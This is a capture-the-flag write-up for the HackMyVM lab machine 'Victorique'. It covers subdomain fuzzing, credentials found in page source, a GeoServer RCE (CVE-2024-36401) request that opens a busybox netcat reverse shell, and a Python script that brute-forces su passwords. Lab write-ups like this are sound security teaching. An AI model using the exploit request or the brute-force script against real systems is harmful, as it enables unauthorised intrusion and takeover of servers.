# [Victorique](https://hackmyvm.eu/machines/machine.php?vm=Victorique) (HackMyVM) — Write-up

## Overview

**Goal:** Gain root on **Victorique**.

**Attack path (high level):**
1. Enumerate services (`22/tcp`, `80/tcp`).
2. Web app denies access unless using `victorique.xyz` (virtual host).
3. Fuzz subdomains → find `gifts.victorique.xyz`.
4. Pull creds from HTML (`ookami:GoS1Ck`) and follow the “gift lies deeper” hint.
5. Discover another vhost via `greatgifts.txt` → `Ka4zuyaKujo0.victorique.xyz`.
6. Jetty page reveals `/geoserver/` → exploit GeoServer RCE → shell as `victorique`.
7. `sudo -l` allows running `/opt/img2txt.py` as root on arbitrary files.
8. Convert hidden PNGs → extract fragments → combine into root password → `su root`.

---

## Table of Contents
- [1) Enumeration](#1-enumeration)
- [2) Web: vhost required (`victorique.xyz`)](#2-web-vhost-required-victoriquexyz)
- [3) Subdomain discovery (`gifts.victorique.xyz`)](#3-subdomain-discovery-giftsvictoriquexyz)
- [4) Hidden vhost via `greatgifts.txt`](#4-hidden-vhost-via-greatgiftstxt)
- [5) Foothold: GeoServer RCE → shell](#5-foothold-geoserver-rce--shell)
- [6) Privilege escalation: `img2txt.py` (sudo) → root password fragments](#6-privilege-escalation-img2txtpy-sudo--root-password-fragments)
- [7) Root](#7-root)

---

## 1) Enumeration

I used my helper script (`hmv`) to discover the IP, update `/etc/hosts`, and run a full `nmap` scan.

```zsh
┌──(cool㉿kali)-[~]
└─$ hmv victorique
...
Found target IPs:
  • 192.168.56.106
...
To apply the environment settings, run:
  source /home/cool/HMV/victorique/.setup_commands.sh
```

```zsh
┌──(cool㉿kali)-[~/HMV]
└─$ source /home/cool/HMV/victorique/.setup_commands.sh
```

Nmap results:

```zsh
└─$ cat /home/cool/HMV/victorique/scans/nmap-victorique-full.log
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

---

## 2) Web: vhost required (`victorique.xyz`)

Initial directory enumeration did not show anything interesting:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u $url -t 500 -o ferox-$ip.log
```

Requesting the site showed a clear message:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ curl $url
<h1>Access Denied: Please use the domain name 'victorique.xyz' to access this site.</h1>
```

So I added the required vhost and switched `$url`:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ echo "$ip victorique.xyz" | sudo tee -a /etc/hosts

└─$ url=http://victorique.xyz
└─$ curl $url | head
<!DOCTYPE html>
<html lang="zh-CN">
<head>
```

---

## 3) Subdomain discovery (`gifts.victorique.xyz`)

Next step was subdomain fuzzing:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ wfuzz -c \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.victorique.xyz" \
  --hh 89 \
  $url
```

This returned (at least) `www` and `gifts`.

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ echo "$ip gifts.victorique.xyz" | sudo tee -a /etc/hosts
└─$ url=http://gifts.victorique.xyz
```

Inspecting the HTML source revealed credentials embedded in the page:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ curl -s $url | grep -oE 'ookami|GoS1Ck' | sort -u
GoS1Ck
ookami
```

**Creds:** `ookami:GoS1Ck`

After logging in, the application displayed:

> "The cunning gray wolf has deceived you. The gift lies deeper."

So I continued enumerating the `gifts` vhost.

---

## 4) Hidden vhost via `greatgifts.txt`

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u $url -t 500 -o ferox-$ip-gifts.log
```

This revealed:

- `http://gifts.victorique.xyz/greatgifts.txt`

Inside the file, the key detail was:

- **Real Gifts:** `Ka4zuyaKujo0`

I added the new vhost:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ echo "$ip Ka4zuyaKujo0.victorique.xyz" | sudo tee -a /etc/hosts
└─$ url=http://Ka4zuyaKujo0.victorique.xyz
```

Requesting it returned a Jetty 404 that listed available contexts — importantly:

- `/geoserver/`

---

## 5) Foothold: GeoServer RCE → shell

Visiting `/geoserver/` confirmed GeoServer was exposed. I followed a public PoC for the GeoServer RCE (CVE reference + reproduction steps) and sent the payload through Burp.

Searched the web and found those two usefull PoCs https://www.youtube.com/watch?v=jNj7bRbO1ww and https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401 
Example request (as used in Burp):

```http
POST /geoserver/wfs HTTP/1.1
Host: ka4zuyakujo0.victorique.xyz
Content-Type: application/xml
Connection: close

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'busybox nc 192.168.56.1 4445 -e /bin/bash')</wfs:valueReference>
</wfs:GetPropertyValue>
```

Listener:

```zsh
┌──(cool㉿kali)-[~/HMV/victorique]
└─$ nc -nlvp 4445
```

Shell as `victorique`:

```zsh
victorique@Victorique:~$ id
uid=1001(victorique) gid=1001(victorique) groups=1001(victorique)

victorique@Victorique:~$ ls
Geo  hint.txt  user.txt

victorique@Victorique:~$ cat user.txt
flag{user-Gosick-Cordelia Gallo}
```

---

## 6) Privilege escalation: `img2txt.py` (sudo) → root password fragments

First check `sudo`:

```zsh
victorique@Victorique:~$ sudo -l
User victorique may run the following commands on Victorique:
    (ALL) /usr/bin/python3 /opt/img2txt.py *
```

The `*` wildcard is the key: we can run the converter on **any** file path as root.

### 6.1) Find suspicious images

```zsh
victorique@Victorique:~$ find / -iname "*.png" 2>/dev/null
...
/opt/.kujo.png
/etc/ssh/.shinigami.png
/var/www/html/.victorique.png
...
```

### 6.2) Convert images to ASCII and extract fragments

The script expects `--input` and `--output`:

```zsh
victorique@Victorique:/tmp$ sudo python3 /opt/img2txt.py --help
usage: Image to ASCII [-h] [--input INPUT] [--output OUTPUT] [--mode {simple,complex}] [--num_cols NUM_COLS]
```

Convert the hidden images:

```zsh
victorique@Victorique:/tmp$ sudo python3 /opt/img2txt.py --input /etc/ssh/.shinigami.png --output shinigami.txt --mode simple
victorique@Victorique:/tmp$ sudo python3 /opt/img2txt.py --input /var/www/html/.victorique.png --output haru.txt --mode simple
victorique@Victorique:/tmp$ sudo python3 /opt/img2txt.py --input /opt/.kujo.png --output sunset.txt --mode simple
```

In my case, the outputs contained the three fragments:

- `ch4mp`
- `C11pp3r5`
- `10n5h1p`

### 6.3) Build candidate passwords and test

Generate all permutations:

```zsh
victorique@Victorique:/tmp$ for a in ch4mp C11pp3r5 10n5h1p; do \
  for b in ch4mp C11pp3r5 10n5h1p; do \
    for c in ch4mp C11pp3r5 10n5h1p; do \
      [[ "$a" != "$b" && "$a" != "$c" && "$b" != "$c" ]] && echo "$a$b$c"; \
    done; \
  done; \
done > possiblepass.txt
```
```zsh
victorique@Victorique:/tmp/findings$ cat su_bruteforce.py 
#!/usr/bin/python3 
import pty, os, sys, select, time

pwfile="possiblepass.txt"

def try_pw(pw):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("su", ["su", "root", "-c", "id"])
    buf=b""
    t0=time.time()
    sent=False
    while time.time()-t0 < 2.5:
        r,_,_=select.select([fd],[],[],0.2)
        if fd in r:
            data=os.read(fd, 4096)
            if not data: break
            buf += data
            if (b"Password" in buf or b"password" in buf) and not sent:
                os.write(fd, (pw+"\n").encode())
                sent=True
            if b"uid=0" in buf:
                return True
    try: os.kill(pid, 9)
    except: pass
    return False

with open(pwfile) as f:
    for line in f:
        pw=line.strip()
        if not pw: continue
        print(f"[*] Trying: {pw}")
        if try_pw(pw):
            print(f"[+] FOUND: {pw}")
            sys.exit(0)
print("[!] No password worked")
victorique@Victorique:/tmp/findings$ 
```

I then tested them via a quick `su` brute helper :

```zsh
victorique@Victorique:/tmp$ python3 su_bruteforce.py
[*] Trying: ch4mpC11pp3r510n5h1p
[*] Trying: ch4mp10n5h1pC11pp3r5
[*] Trying: C11pp3r5ch4mp10n5h1p
[+] FOUND: C11pp3r5ch4mp10n5h1p
```

So the **root password** was:

- `C11pp3r5ch4mp10n5h1p`

---

## 7) Root

```zsh
victorique@Victorique:/tmp$ su root
Password:

root@Victorique:~# id
uid=0(root) gid=0(root) groups=0(root)
```

From there, I used the same `img2txt.py` tool on `root.png` to reveal the flag:

```zsh
root@Victorique:~# python3 /opt/img2txt.py --input root.png --output flag.txt --mode simple --num_cols 700
root@Victorique:~# cat flag.txt
# (Zoom out to read the full flag clearly)
```

---
